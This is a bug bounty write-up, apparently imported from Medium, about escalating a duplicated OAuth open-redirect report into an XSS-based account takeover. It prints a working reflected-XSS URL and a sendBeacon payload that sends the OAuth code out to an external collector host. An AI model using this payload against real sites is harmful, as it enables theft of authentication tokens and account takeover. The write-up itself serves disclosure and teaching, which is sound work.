---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-09-06_never-give-up-the-story-behind-a-dupe-to-triaged.md
original_filename: 2020-09-06_never-give-up-the-story-behind-a-dupe-to-triaged.md
title: Never Give Up, The Story Behind a Dupe-To-Triaged
category: documents
detected_topics:
- oauth
- ssrf
- xss
- command-injection
- otp
tags:
- imported
- documents
- oauth
- ssrf
- xss
- command-injection
- otp
language: en
raw_sha256: 1ec438e2e8bcdb7e587a8322f948ed250f5b8bc69374d54192cf0578c3969b27
text_sha256: 4e29f46abc3cd5da6847d91fcf5ffc77930d4e9e65e923a69daa03fa00da2d3d
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Never Give Up, The Story Behind a Dupe-To-Triaged

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-09-06_never-give-up-the-story-behind-a-dupe-to-triaged.md
- Source Type: markdown
- Detected Topics: oauth, ssrf, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `1ec438e2e8bcdb7e587a8322f948ed250f5b8bc69374d54192cf0578c3969b27`
- Text SHA256: `4e29f46abc3cd5da6847d91fcf5ffc77930d4e9e65e923a69daa03fa00da2d3d`


## Content

---
title: "Never Give Up, The Story Behind a Dupe-To-Triaged"
url: "https://medium.com/@soyelmago/never-give-up-the-story-behind-a-dupe-to-a-triaged-43b72debb6c9"
authors: ["Alan Brian (@soyelmago)"]
bugs: ["XSS", "OAuth", "Account takeover"]
publication_date: "2020-09-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4277
scraped_via: "browseros"
---

# Never Give Up, The Story Behind a Dupe-To-Triaged

Never Give Up, The Story Behind a Dupe-To-Triaged
Alan Brian @soyelmago
Follow
3 min read
·
Sep 7, 2020

96

1

This is the story about how I got a dupe (within 24hs!) and then found another (valid) vulnerability with the same impact.

The application used the Oauth mechanism to authenticate. The endpoint looked like the following:
https://victim.com/auth?client_id=&nonce=[REDACTED]&redirect_uri=https://www.victim.com/dashboard&request=[TOKEN_REDACTED]&response_type=code&scope=openid+accounts&state=[REDACTED]

After seeing that, I quickly changed the redirect_uri parameter to point to my server and I saw how the application redirected me to it… so this is an Open Redirect vulnerability on victim.com. Let’s get an Account Takeover vulnerability!

In my PoC, I made that the redirect_uri parameter point to my server and just that, because the Oauth code is sent within request too. So, that was easy. I made the report, sent it, and after 3 days I got the duplicated notification…

Press enter or click to view image in full size
Press enter or click to view image in full size
My submission (left) Dupe (Right)

Yes, I know what you are thinking, that was a very low hanging fruit, but… I needed to try, and that’s what this story is about: keep trying!

Press enter or click to view image in full size
Keep trying

I thought for a while how to get an Account Takeover, but with different techniques. And then an idea popped in my head like an XSS alert popup ;-)

If I can exploit an XSS vulnerability in that endpoint, maybe I can steal the Oauth token, and that’s it! I made the following PoC:

https://victim.com/auth?client_id=&nonce=[REDACTED]&redirect_uri=https://www.victim.com/dashboard%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&request=[TOKEN_REDACTED]&response_type=code&scope=openid+accounts&state=[REDACTED]

Get Alan Brian @soyelmago’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

It worked!

But, what makes the difference between a simple JavaScript popup and ATO (Account TakeOver)? A cool payload. So let’s try to figure it out (thanks@mastersec !)

Final Payload:

navigator.sendBeacon(‘https://ssrftest.com/x/AAAAA',document.documentElement.innerHTML.split('code'));

Final URL:

https://victim.com/auth?client_id=&nonce=[REDACTED]&redirect_uri=aaa”><script>navigator.sendBeacon(‘https://ssrftest.com/x/AAAAA',document.documentElement.innerHTML.split('code'));</script>&request=[TOKEN_REDACTED]&response_type=code&scope=openid+accounts&state=[REDACTED]

ssrftest.com is a site that allows you to test, for example, SSRF vulnerabilities.

And the result was the authentication token submitted to the server that I control. WIN

I submitted the vulnerability and finally, after 2 days, it got triaged and I received the bounty $$$ :-)

So, always remember, KEEP TRYING!

I hope you enjoyed this write up. Happy Hacking-Hunting

Hope you liked the post! If you would like to contact me, please visit https://www.cintainfinita.com or write to contact@cintainfinita.com.ar.

#BugBounty #BugBountyTips #Hacking
